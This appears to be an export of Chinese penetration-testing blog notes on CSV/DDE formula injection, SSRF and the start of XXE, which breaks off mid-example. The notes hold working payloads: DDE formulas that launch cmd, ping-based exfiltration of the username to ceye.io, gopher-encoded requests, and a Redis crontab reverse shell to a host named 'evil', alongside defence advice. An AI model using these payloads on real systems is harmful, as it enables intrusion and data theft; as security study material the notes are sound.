    <title>DDE注入(CSV)漏洞</title>
    <url>/2020/10/29/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DDE(CSV)%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="DDE注入-CSV-漏洞"><a href="#DDE注入-CSV-漏洞" class="headerlink" title="DDE注入(CSV)漏洞"></a>DDE注入(CSV)漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    这部分漏洞主要是利用服务器端没有对excel表格中的字段进行特定的过滤处理，导致攻击者可以攻击网站其他用户</p>
<a id="more"></a>

<h2 id="Excel解析机制"><a href="#Excel解析机制" class="headerlink" title="Excel解析机制"></a>Excel解析机制</h2><p>​    在Excel任何以<code>=</code>、<code>+</code>、<code>-</code>、<code>@</code>字符开头的单元格都将被电子表格软件解释为公式</p>
<p><img data-src="./DDE(CSV)%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt></p>
<h2 id="动态数据交换-DDE-和CSV注入"><a href="#动态数据交换-DDE-和CSV注入" class="headerlink" title="动态数据交换(DDE)和CSV注入"></a>动态数据交换(DDE)和CSV注入</h2><ul>
<li>动态数据交换（DDE），全称DynamicData Exchange，是Windows下进程间通信协议，支持Microsoft Excel，LibreOffice和Apache OpenOffice。Excel、Word、Rtf、Outlook都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含DDE公式的CSV文件，那么在打开该文件时，Excel就会尝试执行外部应用</li>
<li>CSV注入, 也叫公式注入，一般发生在当网页把不可信的输入嵌入到CSV文件中时。当一个电子表格程序（比如说Microsoft Excel 或者 LibreOffice Calc）打开一个CSV文件时，任何以‘=’开头的单元格内容讲会被解析为公式，在这个过程中，CSV中的所有Excel公式都会执行，很易被滥用并执行恶意代码<ul>
<li>利用电子表格软件的漏洞（例如CVE-2014-3524）劫持用户的计算机</li>
<li>利用用户偏向于忽略电子表格软件的安全警告这一习惯，从他们自己的网站下载电子表格，从而劫持用户的计算机</li>
<li>从用户打开的电子表格或者其他电子表格中获取数据</li>
</ul>
</li>
<li>在Excel任何以’=’、’+’、’-‘、‘@’字符开头的单元格都将被电子表格软件解释为公式，由于表达式就是可以执行的代码，假如把输入内容修改为：=cmd|’/c notepad.exe’!A0，Excel会尝试调用本机CMD命令，给出友好提示，若用户在无意识状态下点击“是”之后，成功弹出记事本</li>
</ul>
<p><img data-src="./DDE(CSV)%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt></p>
<p><img data-src="./DDE(CSV)%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt></p>
<h2 id="CSV注入攻击路线"><a href="#CSV注入攻击路线" class="headerlink" title="CSV注入攻击路线"></a>CSV注入攻击路线</h2><p><img data-src="./DDE(CSV)%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" alt></p>
<ul>
<li>业务系统接受用户输入并导出为csv -&gt; 恶意用户通过界面输入payload -&gt; 受害者下载文件并在PC运行 -&gt; 受害者PC被攻击</li>
<li>CSV注入攻击是一种攻击<strong>源来自网站</strong>，最终<strong>目标是普通用户PC</strong>的一种攻击</li>
</ul>
<h2 id="CSV注入危害"><a href="#CSV注入危害" class="headerlink" title="CSV注入危害"></a>CSV注入危害</h2><ul>
<li>添加用户</li>
<li>开启任意应用程序</li>
<li>操作注册表</li>
<li>反弹shell</li>
<li>钓鱼</li>
<li>等等，当用户的安全意识不高，几乎可以干任何事情</li>
</ul>
<h2 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h2><ul>
<li>关注系统中是否有导出为csv或xls表格的功能，一般存在于信息统计，日志、配置导出等功能处</li>
<li>确定导出的内容是否用户可控<ul>
<li>可能在界面可直接进行编辑/新增</li>
<li>通过数据篡改/HPP/追踪数据源等方式看是否可以控制输入</li>
</ul>
</li>
<li>输入处写入测试脚本=2*10，导出后查看表格内容是否解析</li>
<li>存在过滤，尝试绕过，最后进行OS执行等深入利用</li>
</ul>
<h2 id="常用POC"><a href="#常用POC" class="headerlink" title="常用POC"></a>常用POC</h2><ul>
<li><code>=cmd|&#39;/c notepad.exe&#39;!A0</code></li>
<li><code>=SUM(1+1)*cmd|&#39; /C notepad.exe &#39;!A0</code></li>
<li><code>=MSEXCEL|&#39;\..\..\..\Windows\System32\cmd.exe /c notepad.exe&#39;!&#39;&#39;</code></li>
<li><code>=HYPERLINK(&quot;https://evil.com&quot;,&quot;evil&quot;)</code>加载HYPERLINK(超链接)钓鱼</li>
<li><code>=cmd|&#39;/C ping -t znu8fe.ceye.io -l 25152&#39;!&#39;A1&#39;</code></li>
<li><code>=cmd|&#39;/C ping -t %USERNAME%.znu8fe.ceye.io -l 25152&#39;!&#39;A1&#39;</code> （ceye平台数据外带）</li>
</ul>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><ul>
<li><code>-3+2+cmd |&#39; /C calc&#39; !A0</code><br> 在等于号被过滤时，可以通过运算符+-的方式绕过</li>
<li><code>%0A-3+3+cmd|&#39; /C calc&#39;!D2</code><br>参数处输入此payload，%0A被解析，从而后面的数据跳转到下一行</li>
<li><code>;-3+3+cmd|&#39; /C calc&#39;!D2</code><br>导出文件为csv时，若系统在等号=前加了引号’过滤，则可以使用分号绕过，分号;可分离前后两部分内容使其分别执行</li>
<li><code>@SUM(cmd|&#39;/c calc&#39;!A0)</code></li>
<li><code>=HYPERLINK(&quot;https://evil.com&quot;)</code></li>
</ul>
<h2 id="防御技巧"><a href="#防御技巧" class="headerlink" title="防御技巧"></a>防御技巧</h2><ul>
<li>确保单元格不以特殊字符（“+、-、@、=”）开头</li>
<li>对单元格的内容进行特殊字符（“+、-、@、=”）过滤</li>
<li>先对原始输入内容进行转义（双引号前多加一个双引号），然后再添加tab键和双引号防止注入</li>
<li>导出为Excel格式前，利用代码把单元格的格式设置为文本（对CSV不生效）</li>
</ul>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul>
<li>添加注释，实际上是不能利用的，如果需要利用，那么=必须在行首</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>DDE</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF学习笔记</title>
    <url>/2020/10/19/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="SSRF学习笔记"><a href="#SSRF学习笔记" class="headerlink" title="SSRF学习笔记"></a>SSRF学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    服务器端请求伪造（SSRF）是指攻击者能够从易受攻击的Web应用程序发送精心设计的请求的对其他网站进行攻击。(利用一个可发起网络请求的服务当作跳板来攻击其他服务)，利用该漏洞可以发起内网攻击，危害巨大</p>
<a id="more"></a>

<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt></p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>​    由于一般开发者仅仅对于比较常见的SQL注入，XSS等比较熟悉，因此在开发时，可能会疏忽对于SSRF漏洞的防御手段</p>
<ul>
<li><p>内外网的端口及服务扫描</p>
</li>
<li><p>内网主机敏感信息泄露</p>
</li>
<li><p>通过HTTP的方式对内网web发起进攻，例如GET方式的sql注入，struts2漏洞，jboss漏洞等 </p>
</li>
<li><p>与XXE组成攻击链 </p>
</li>
<li><p>攻击内网程序，例如redis未授权 </p>
</li>
<li><p>利用<code>file</code> <code>dict</code> <code>gopher</code>协议读取内网本地信息，执行命令等</p>
</li>
<li><p>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
</li>
</ul>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>从WEB功能上寻找(服务器能够对外发起网络请求的地方，就可能存在SSRF漏洞)</p>
<ul>
<li><p>文件处理、编码处理、转码等服务</p>
</li>
<li><p>从URL关键字寻找(share、wap、url、link、src、source、target、u、3g、<br>display、sourceURl、imageURL、domain…)</p>
</li>
<li><p>社交分享功能：获取超链接的标题等内容进行显示</p>
</li>
<li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
</li>
<li><p>在线翻译：给网址翻译对应网页的内容</p>
</li>
<li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
</li>
<li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
</li>
<li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
</li>
<li><p>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
</li>
<li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
</li>
<li><p>邮件系统：比如接收邮件服务器地址</p>
</li>
<li><p>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
</li>
<li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
</li>
</ul>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><ul>
<li>假设有如下url <code>http://www.xxx.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</code>,F12浏览器发起对应请求，后端发起请求获取此图片，则可能存在SSRF问题，如果F12未看到任何请求，则不存在SSRF问题(前端链接获取后，是由js来获取对应参数交由<code>window.location</code>来处理相关的请求，或者加载到当前的<code>iframe</code>框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求)</li>
<li>关键点在于判断是不是服务器发起的请求</li>
</ul>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><table>
<thead>
<tr>
<th align="center"></th>
<th>PHP</th>
<th>Java</th>
<th>curl</th>
<th>Perl</th>
<th>ASP.NET</th>
</tr>
</thead>
<tbody><tr>
<td align="center">http</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">https</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">gopher</td>
<td>–with-curlwrappers</td>
<td>before JDK1.7</td>
<td>before 7.49.0 不支持\x00</td>
<td>yes</td>
<td>before version 3</td>
</tr>
<tr>
<td align="center">tftp</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>before 7.49.0 不支持\x00</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">dict</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">file</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">ftp</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">imap</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td align="center">pop3</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>yes</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td align="center">rtsp</td>
<td>–with-curlwrappers</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">smb</td>
<td>–with-curlwrappers</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
<td>yes</td>
</tr>
<tr>
<td align="center">smtp</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">telnet</td>
<td>–with-curlwrappers</td>
<td>no</td>
<td>yes</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">ssh2</td>
<td>受限于allow_url_fopen</td>
<td>no</td>
<td>no</td>
<td>受限于Net:SSH2</td>
<td>no</td>
</tr>
<tr>
<td align="center">ogg</td>
<td>受限于allow_url_fopen</td>
<td>no</td>
<td>no</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">expect</td>
<td>受限于allow_url_fopen</td>
<td>no</td>
<td>no</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">ldap</td>
<td>no</td>
<td>no</td>
<td>no</td>
<td>yes</td>
<td>no</td>
</tr>
<tr>
<td align="center">php</td>
<td>yes</td>
<td>no</td>
<td>no</td>
<td>no</td>
<td>no</td>
</tr>
<tr>
<td align="center">zlib/bzip2/zip</td>
<td>受限于allow_url_fopen</td>
<td>no</td>
<td>no</td>
<td>no</td>
<td>no</td>
</tr>
</tbody></table>
<h3 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h3><p><code>http://127.0.0.1/ssrf/index.php?url=file:///C:/SUService.log</code></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt></p>
<h3 id="Dict协议"><a href="#Dict协议" class="headerlink" title="Dict协议"></a>Dict协议</h3><p>​    dict协议是一个字典服务协议，在ssrf中可以用来探测内网服务信息，导致信息泄露<br>举例：可以用来直接探索常见的应用信息例如试试ssh 22，ftp 21，mysql 3306 ,redis6739等</p>
<ul>
<li><code>127.0.0.1/ssrf/index.php?url=dict://127.0.0.1:3306/info</code></li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt></p>
<ul>
<li><code>http://127.0.0.1/ssrf/index.php?url=dict://127.0.0.1:80</code></li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png" alt></p>
<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><ul>
<li>gopher协议，是一个比http协议还古老的协议，早期就是用来替代现在http协议的，利用时有一定的局限性，例如php中并不会默认开启fopen的gopher wrapper，导致利用失败</li>
<li>gopher协议在ssrf中绝对算得上是神之协议，可以利用gopher发送各种格式的请求包，这样就可以解决漏洞点不在GET参数的问题</li>
<li>基本协议格式url: <code>gopher://host:port/gopher-path</code>_后接TCP数据流</li>
</ul>
<p><strong>eg:</strong></p>
<ul>
<li>假设服务器存在一个命令执行漏洞</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"begin"</span>;</span><br><span class="line">	var_dump($_POST[<span class="string">'e'</span>]);</span><br><span class="line">	system($_POST[<span class="string">'e'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.png" alt></p>
<ul>
<li>下面用gopher协议构造这个数据包</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原始数据包</span><br><span class="line">POST &#x2F;ssrf&#x2F;command.php HTTP&#x2F;1.1</span><br><span class="line">Host: 172.16.237.224</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 19</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">e&#x3D;echo myname&gt;a.txt</span><br><span class="line"></span><br><span class="line">-------------------------------</span><br><span class="line">空格替换为 %20</span><br><span class="line">回车换行二次url编码为 %250d%250a</span><br><span class="line"></span><br><span class="line">结果如下:</span><br><span class="line"></span><br><span class="line">POST%20&#x2F;ssrf&#x2F;command.php%20HTTP&#x2F;1.1%250d%250aHost:%20172.16.237.224%250d%250aUser-Agent:%20Mozilla&#x2F;5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:80.0)%20Gecko&#x2F;20100101%20Firefox&#x2F;80.0%250d%250aAccept:%20text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8%250d%250aAccept-Language:%20zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2%250d%250aAccept-Encoding:%20gzip,%20deflate%250d%250aConnection:%20close%250d%250aUpgrade-Insecure-Requests:%201%250d%250aContent-Length:%2019%250d%250aContent-Type:%20application&#x2F;x-www-form-urlencoded%250d%250a%250d%250ae&#x3D;echo%20myname&gt;a.txt</span><br></pre></td></tr></table></figure>

<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png" alt></p>
<h2 id="扩展攻击方式"><a href="#扩展攻击方式" class="headerlink" title="扩展攻击方式"></a>扩展攻击方式</h2><ul>
<li>攻击内网未授权redis</li>
<li>攻击内网其他探测到的可溢出程序</li>
</ul>
<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><ul>
<li>更改IP写法 可以采用十六进制 八进制 二进制 十进制</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如192.168.0.1可以改写成以下方式</span><br><span class="line">	(1)、8进制格式：0300.0250.0.1</span><br><span class="line">	(2)、16进制格式：0xC0.0xA8.0.1</span><br><span class="line">	(3)、10进制整数格式：3232235521</span><br><span class="line">	(4)、16进制整数格式：0xC0A80001</span><br><span class="line">	如果是127.0.0.1甚至可以缩写为127.1</span><br></pre></td></tr></table></figure>

<ul>
<li>利用url解析  eg ：例如访问<a href="http://www.baidu.com@127.0.0.1与http://127.0.0.1请求是相同的，此脚本访问请求得到的内容都是127.0.0.1的内容，该绕过同样在URL跳转绕过中适用" target="_blank" rel="noopener">www.baidu.com@127.0.0.1与http://127.0.0.1请求是相同的，此脚本访问请求得到的内容都是127.0.0.1的内容，该绕过同样在URL跳转绕过中适用</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://test.com@127.0.0.1     &gt;&gt;&gt; http://127.0.0.1:80 </span><br><span class="line">http://127.0.0.1#@test.com   &gt;&gt;&gt; http://127.0.0.1:80</span><br></pre></td></tr></table></figure>

<ul>
<li>利用302跳转 神奇的域名<a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a>  当访问<a href="http://192.168.231.134.xip.io，相当于访问192.168.231.134" target="_blank" rel="noopener">http://192.168.231.134.xip.io，相当于访问192.168.231.134</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 特殊域名</span></span><br><span class="line">http://127.0.0.1.xip.io             &gt;&gt;&gt; http://127.0.0.1:80 </span><br><span class="line">http://www.owasp.org.127.0.0.1.xip.io    &gt;&gt;&gt; http://127.0.0.1:80 </span><br><span class="line">https://127.0.0.1.nip.io           &gt;&gt;&gt; http://127.0.0.1:80</span><br></pre></td></tr></table></figure>

<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png" alt></p>
<ul>
<li>短地址</li>
<li>利用[::]绕过localhost:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://[::]:80            &gt;&gt;&gt; http://127.0.0.1:80</span><br><span class="line">http://[::1]:80           &gt;&gt;&gt; http://127.0.0.1:80</span><br></pre></td></tr></table></figure>

<ul>
<li>利用句号</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png" alt></p>
<h2 id="SSRF漏洞防御"><a href="#SSRF漏洞防御" class="headerlink" title="SSRF漏洞防御"></a>SSRF漏洞防御</h2><ul>
<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准</li>
<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态</li>
<li>限制请求的端口为http常用的端口，比如，80,443,8080,8090</li>
<li>黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网</li>
<li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题</li>
<li>禁用函数( file_get_contents()、fsockopen()、curl_exec()三个函数（PHP）防止SSRF)</li>
</ul>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/11.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/12.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/13.png" alt></p>
<ul>
<li><p>利用SSRF对内网127.0.0.1进行端口扫描</p>
</li>
<li><p>扫描结果81端口存在flag</p>
</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/14.png" alt></p>
<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h3><p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/15.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/16.png" alt></p>
<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h3><p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/17.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/18.png" alt></p>
<h3 id="第四个-Weblogic-SSRF漏洞"><a href="#第四个-Weblogic-SSRF漏洞" class="headerlink" title="第四个 Weblogic SSRF漏洞"></a>第四个 Weblogic SSRF漏洞</h3><p><a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p>
<ul>
<li>docker 环境</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/19.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.png" alt></p>
<ul>
<li>存在http端口的报错</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/21.png" alt></p>
<ul>
<li>端口关闭的报错</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/22.png" alt></p>
<ul>
<li>非http端口的报错</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/23.png" alt></p>
<ul>
<li><p>至此我们可以利用 SSRF 漏洞探测主机内网信息</p>
</li>
<li><p>可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
</li>
<li><p>命令如下</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1'\n\n\n\n"</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<ul>
<li>url编码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">set%</span><span class="bash">201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20<span class="string">'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261'</span>%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span></span><br></pre></td></tr></table></figure>

<ul>
<li>换行符是“\r\n”，也就是“%0D%0A”</li>
</ul>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/24.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/25.png" alt></p>
<p><img data-src="./SSRF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/26.png" alt></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><h3 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$URL &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">	&#x2F;&#x2F; 创建一个CURL资源</span><br><span class="line">	$CH &#x3D; CURL_INIT();</span><br><span class="line">	&#x2F;&#x2F; 设置URL和相关的选项</span><br><span class="line">	CURL_SETOPT($CH, CURLOPT_URL, $URL);</span><br><span class="line">	CURL_SETOPT($CH, CURLOPT_HEADER, FALSE);</span><br><span class="line">	CURL_SETOPT($CH, CURLOPT_RETURNTRANSFER, TRUE);</span><br><span class="line">	CURL_SETOPT($CH, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class="line">	CURL_SETOPT($CH, CURLOPT_FOLLOWLOCATION, TRUE);</span><br><span class="line">	&#x2F;&#x2F; 抓取URL并把它传递给浏览器</span><br><span class="line">	$RES &#x3D; CURL_EXEC($CH);</span><br><span class="line">	&#x2F;&#x2F; 关闭CURL资源，并释放系统资源</span><br><span class="line">	CURL_CLOSE($CH);</span><br><span class="line">	echo $RES;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE学习笔记</title>
    <url>/2020/10/29/blog_formal/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="XXE学习笔记"><a href="#XXE学习笔记" class="headerlink" title="XXE学习笔记"></a>XXE学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    <code>XXE = XML External Entity</code> 即外部实体，从安全角度理解成XML External Entity attack XML外部实体注入攻击</p>
<p>​    许多不同的客户端技术，如web端，移动端，云端等使用XML向业务应用程序发送消息。为了使应用程序使用这些自定义的XML消息，应用程序必须去解析XML文档并检查格式是否正确。如果应用是通过用户上传处理XML文件或POST请求的，此时很有可能会受到XXE攻击</p>
<a id="more"></a>

<h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>​    正式进入XXE之前，先了解下XML的基础知识</p>
<ul>
<li><p>XML 指可扩展标记语言（EXtensible Markup Language）</p>
</li>
<li><p>XML 是一种标记语言，很类似 HTML</p>
</li>
<li><p>XML 的设计宗旨是存储、传输数据，而非显示数据</p>
</li>
<li><p>XML 标签没有被预定义。您需要自行定义标签</p>
</li>
<li><p>XML 被设计为具有自我描述性</p>
</li>
<li><p>XML 是 W3C 的推荐标准</p>
</li>
</ul>
<hr>
<p>  特点:</p>
<ul>
<li>XML仅仅是纯文本，他不会做任何事情</li>
<li>XML可以自己发明标签（允许定义自己的标签和文档结构）</li>
<li>XML 无所不在。XML 是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行</li>
</ul>
<hr>
<ul>
<li>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言</li>
<li>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--  XML声明   --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>   </span><br><span class="line"> <span class="comment">&lt;!--  DTD部分 定义实体必须写在DTD部分   --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">xxe</span> <span 